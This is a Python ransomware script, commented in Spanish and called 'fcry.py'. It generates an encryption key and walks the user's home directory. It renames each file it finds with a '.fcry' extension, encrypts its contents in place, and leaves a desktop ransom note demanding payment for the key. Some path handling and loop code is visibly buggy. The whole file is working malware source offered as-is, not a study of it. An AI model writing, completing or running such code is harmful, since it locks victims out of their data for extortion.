from sys import exit
from time import sleep
from sys import platform
from getpass import getuser
from signal import signal, SIGINT
from cryptography.fernet import Fernet
from os import walk, rename, system, path
from colorama import Fore, Back, Cursor, init

init()

# Array en donde se guardan los directorios
directorio_raiz = []
cam_s = []
cam_fc = []

# Dirección raíz
path_win = ""

# Ruta para guardar clave de encryptación
route_crypt = ''

# Ruta para guardar las capturas de pantalla
ruta_capturas = ""

usuario = ""

def handler(signal_received, frame):
	print( Back.RED + Fore.BLACK + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
	exit(0)

def generarClave():
	global route_crypt
	key = Fernet.generate_key()
	if platform.startswith('win32'):
		route_crypt = 'C:\\Windows\\'
	elif platform.startswith('linux'):
		route_crypt = '/home' + usuario  + ' Escritorio/'
	route_crypt = route_crypt + 'fcry.key'
	with open(route_crypt, 'wb') as key_file:
		key_file.write(key)

def cargarClave():
	return open(route_crypt, 'rb').read()

def encryptarDatosUsuario(items, key):
	f = Fernet(key)
	for item in items:
		if path.isfile(item):
			with open(item, 'rb') as file:
				file_data = file.read()
				encrypted_data = f.encrypt(file_data)
				with open(item, 'wb') as file:
					print("Encriptando")
					file.write(encrypted_data)

def messageFinal():
	route = ""
	if platform.startswith('win32'):
		route = "C:\\Users\\" + usuario + "\\Desktop\\TWH-README.txt"
	elif platform.startswith('linux'):
		route = "/home" + usuario  + "/Escritorio/TWH-README.txt"
	file = open(route, 'w')
	file.write("--------------README.txt----------------\n")
	file.write("   AL PARECER TIENEN UN PROBLEMA DE\n")
	file.write("        SEGURIDAD EN SU RED\n")
	file.write("   SUS ARCHIVOS HAN SIDO ENCRYPTADOS\n")
	file.write("NECESITA UNA CLAVE PARA DESENCRYPTARLOS\n")
	file.write("      Y TIENE QUE PAGAR POR ELLA")
	file.write("--------------README.txt----------------\n")
	file.close()

def getListArch():
	key = cargarClave()
	if platform.startswith("linux"):
		directorio_raiz = "/home" + usuario
	elif platform.startswith("win32"):
		directorio_raiz = "C:\\Users\\" + usuario + "\\"
	for nombre_directorio, dirs, ficheros in walk(directorio_raiz):
		print(Fore.GREEN + "|-[D]" + nombre_directorio + Fore.RESET)
		for nombre_fichero in ficheros:
			print(Fore.YELLOW + "|" + Fore.RESET)
			print(Fore.YELLOW + "|--[F]" + nombre_fichero + Fore.RESET)
			if path.isfile(nombre_directorio + "/" + nombre_fichero):
				cam_s.append(nombre_directorio + "/"  + nombre_fichero)
	for i in range(0, len(cam_s)):
		cam_fc.append(cam_s[i] + ".fcry")
		rename(cam_s[i], cam_fc[i])
	encryptarDatosUsuario(cam_fc, key)
	messageFinal()

def banner():
	print(Fore.GREEN + "+--------------------------------------------+" + Fore.RESET)
	print(Fore.GREEN + "|                                            |" + Fore.RESET)
	print(Fore.GREEN + "|     ███████╗ ██████╗██████╗ ██╗   ██╗      |" + Fore.RESET)
	print(Fore.GREEN + "|     ██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝      |" + Fore.RESET)
	print(Fore.GREEN + "|     █████╗  ██║     ██████╔╝ ╚████╔╝       |" + Fore.RESET)
	print(Fore.GREEN + "|     ██╔══╝  ██║     ██╔══██╗  ╚██╔╝        |" + Fore.RESET)
	print(Fore.GREEN + "|     ██║     ╚██████╗██║  ██║   ██║         |" + Fore.RESET)
	print(Fore.GREEN + "|     ╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝         |" + Fore.RESET)
	print(Fore.GREEN + "|                                            |" + Fore.RESET)
	print(Fore.GREEN + "+--------------------------------------------+" + Fore.RESET)

	usuario = getuser()
	sistema = platform

	print(Fore.CYAN + "INFORMACIÓN GENERAL DEL SISTEMA" + Fore.RESET + "\n")
	print(Back.GREEN + Fore.BLACK + "Usuario:" + Fore.RESET + Back.RESET + " " + Fore.GREEN + usuario + Fore.RESET + "\n")
	print(Back.YELLOW + Fore.BLACK + "Sistema:" + Fore.RESET + Back.RESET + " " + Fore.YELLOW + sistema + Fore.RESET + "\n")
	getListArch()

if __name__ == '__main__':
	generarClave()
	ind = "=    "
	try:
		for l in 200:
			if ind == "=    ":
				ind = "== "
			elif ind == "== ":
				ind = "==="
			elif ind == "===":
				ind = "===="
			elif ind == "====":
				ind = "====="
			else:
				ind = "=    "
			sleep(1)
			print(Cursor.UP(1)+Cursor.FORWARD(2)+Fore.YELLOW + "[  " + ind + "    ]" + "Iniciando fcry.py")
		if platform.startswith("win32"):
			system("cls")
		elif platform.startswith("linux"):
			system("clear");
	except:
		print( Back.RED + "Ocurrió un error!" + Back.RESET)
	print("\n")
	banner()
	print("\n")